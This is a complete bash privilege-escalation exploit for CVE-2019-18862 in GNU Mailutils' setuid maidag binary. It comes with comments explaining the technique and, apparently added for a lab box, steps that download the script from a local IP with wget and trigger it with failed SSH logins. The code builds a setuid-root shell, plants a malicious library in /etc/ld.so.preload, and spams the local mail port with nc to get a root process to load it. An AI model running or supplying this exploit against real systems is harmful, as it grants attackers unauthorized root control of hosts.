#!/bin/bash
# GNU Mailutils 2.0 <= 3.7 maidag url local root (CVE-2019-18862)
# uses ld.so.preload technique
# Exploitation Steps
# 1. Go to a world writable directory and copy the exploit there
#    cd /dev/shm
#    wget http://192.168.49.68:8000/maidag3.7_ldpreload.sh
#    chmod +x maidag3.7_ldpreload.sh
#    ./maidag3.7_ldpreload.sh                               # run the exploit

# 2.  If we check the contents of /var/tmp now, we will find a new sh binary, but it's owned by the user who ran the exploit and doesn't have SUID.
#    ls -al /var/tmp/sh  
#     -rwxr-xr-x 1 rocketchat rocketchat 16792 Apr  2 21:06 /var/tmp/sh

# 3. Let's attempt to cause a privileged execution by trying to SSH to the target as rocketchat. Even if we don't have the password, once we try to log in, the exploit will run
#    ssh rocketchat@$IP
#    Use 3 times the wrong password

# 4. Let's check on our new sh binary in /var/tmp again.
#    ls -al /var/tmp/sh  
#   -rwsr-xr-x 1 root root 16792 Apr  2 21:06 /var/tmp/sh

# 5. Now just run the /var/tmp/sh script to obtain shell.
#   ./sh
#   id
#   uid=0(root) gid=0(root) groups=0(root),1000(rocketchat)
# ==================================================================================================================
# ==================================================================================================================
#
# Original discovery and proof of concept by Mike Gualtieri:
# - https://www.mike-gualtieri.com/posts/finding-a-decade-old-flaw-in-gnu-mailutils
# - https://git.savannah.gnu.org/cgit/mailutils.git/commit/?id=739c6ee525a4f7bb76b8fe2bd75e81a122764ced
#
# The GNU Mailutils mail delivery agent `maidag` executable
# is set-uid root and accepts a `--url` argument which allows
# writing and appending data to arbitrary files.
#
# However, the file contents are not fully user-controlled.
# For example: 
#
#   From root@ubuntu-16-04-1-x64 Tue Dec 24 00:54:12 2019
#
#   <user controlled content>
#
# However, /etc/ld.so.preload parsing is extremely forgiving.
# We can compile a shared object and write the shared object
# path to /etc/ld.so.preload.
#
# The /etc/ld.so.preload file is set readable only by root:
#
#   -rw------- 1 root user 73 Dec 24 19:26 /etc/ld.so.preload
#
# The dynamic loader does not have elevated privileges,
# and cannot read the file, even when executing privileged
# set-uid executables. For this reason, we cannot simply
# force ld to execute the payload by executing a set-uid binary.
#
# On one hand, this is nice, as ld won't throw a bunch of errors
# due to the garbage 'From' line, every time a user runs something.
# On the other hand, this sucks, as we have to wait for root
# to execute something. Also, if a user attempts to execute
# something privileged in an interactive shell, such as su,
# they will be met with a bunch of LD preload errors,
# which is a bit of a giveaway.
#
# If our user session context has PolKit, we could force execution
# of ld with elevated privileges using pkexec in combination with
# a suitable helper:
#
#   pkexec /usr/lib/unity-settings-daemon/usd-wacom-led-helper
#
# We could also try messing with systemd services, but may
# run into issues with apparmor:
#
#   Dec 24 20:26:23 ubuntu-16-04-1-x64 kernel: [124071.568923]
#   audit: type=1400 audit(1577179583.778:94): apparmor="DENIED"
#   operation="open" profile="/usr/lib/NetworkManager/nm-dhcp-helper"
#   name="/etc/ld.so.preload" pid=111451 comm="nm-dhcp-helper"
#   requested_mask="r" denied_mask="r" fsuid=0 ouid=0
#
# If the system has postfix installed, we can trigger privileged
# execution to occur in /var/spool/postfix by spamming TCP connections
# to the listening postfix service. This may also work with other
# network services.
#
# Tested on GNU Mailutils 3.7 compiled from source on
# Ubuntu Linux 16.04.1 (x86_64) with postfix 3.1.0-3ubuntu0.3.
# ---
# user@ubuntu-16-04-1-x64:~/Desktop$ ./exploit.ldpreload.sh 
# [+] /usr/local/sbin/maidag is set-uid
# [*] Compiling...
# [*] Writing stub to /tmp/stub ...
# [*] Adding /tmp/libmaidag.so to /etc/ld.so.preload...
# -rw------- 1 root user 75 Dec 25 14:03 /etc/ld.so.preload
# [*] Wait for your shell to be set-uid root: /var/tmp/sh
# [*] Spamming TCP connections to 127.0.0.1:25 ...
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# 220 ubuntu-16-04-1-x64.localdomain ESMTP Postfix (Ubuntu)
# 221 2.0.0 Bye
# [+] Success:
# -rwsrwxr-x 1 root root 8712 Dec 25 14:03 /var/tmp/sh
# [*] Cleaning up ...
# root@ubuntu-16-04-1-x64:~/Desktop# id
# uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(user)
# ---
# <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2019-18862

rootshell="/var/tmp/sh"
payload="/tmp/payload"
stub="/tmp/stub"
lib_path="/tmp/libmaidag.so"
maidag_path="/usr/local/sbin/maidag"

if test -u "${maidag_path}"; then
  /bin/echo "[+] ${maidag_path} is set-uid"
else
  /bin/echo "[-] ${maidag_path} is not set-uid"
  exit 1
fi

command_exists() {
  command -v "${1}" >/dev/null 2>/dev/null
}

if ! command_exists gcc; then
  /bin/echo '[-] gcc is not installed'
  exit 1
fi

/bin/echo "[*] Compiling..."

cat > /tmp/rootshell.c << "EOF"
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", NULL);
}
EOF

if ! gcc /tmp/rootshell.c -o "${rootshell}"; then
  /bin/echo '[-] Compiling rootshell.c failed'
  exit 1
fi

/bin/rm /tmp/rootshell.c

cat > /tmp/libmaidag.c << "EOF"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

void init(void) __attribute__((constructor));                                 

void __attribute__((constructor)) init() {
  if (setuid(0) || setgid(0))
    _exit(1);
  unlink("/etc/ld.so.preload");
  system("chown root:root /var/tmp/sh");
  system("chmod u+s /var/tmp/sh");
  _exit(0);
}
EOF

if ! gcc /tmp/libmaidag.c -fPIC -shared -o "${lib_path}"; then
  /bin/echo '[-] Compiling libmaidag.c failed'
  exit 1
fi

/bin/rm /tmp/libmaidag.c

/bin/echo "[*] Writing stub to ${stub} ..."

/bin/echo -e "\n${lib_path}\n" > "${stub}"

/bin/echo "[*] Adding ${lib_path} to /etc/ld.so.preload..."

$maidag_path --url "/etc/ld.so.preload" < "${stub}"

/bin/rm "${stub}"

if ! test -e /etc/ld.so.preload; then
  /bin/echo "[-] Failed to create /etc/ld.so.preload"
  /bin/rm "${rootshell}"
  /bin/rm "${lib_path}"
  exit 1
fi

/bin/ls -la /etc/ld.so.preload

/bin/echo "[*] Wait for your shell to be set-uid root: ${rootshell}"

if ! command_exists nc; then
  /bin/echo "[!] Remember to cleanup ${lib_path} when done"
  exit 1
fi

/bin/echo "[*] Spamming TCP connections to 127.0.0.1:25 ..."

for i in {1..100}
do
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25
  /bin/echo QUIT | nc 127.0.0.1 25

  if test -u "${rootshell}"; then
    break
  fi
done

if ! test -u "${rootshell}"; then
  /bin/echo "[-] Failed. You'll have to wait for root to execute something"
  /bin/echo "[!] Remember to cleanup ${lib_path} when done"
  exit 1
fi

/bin/echo '[+] Success:'
ls -la "${rootshell}"

/bin/echo '[*] Cleaning up ...'
/bin/rm "${lib_path}"

$rootshell
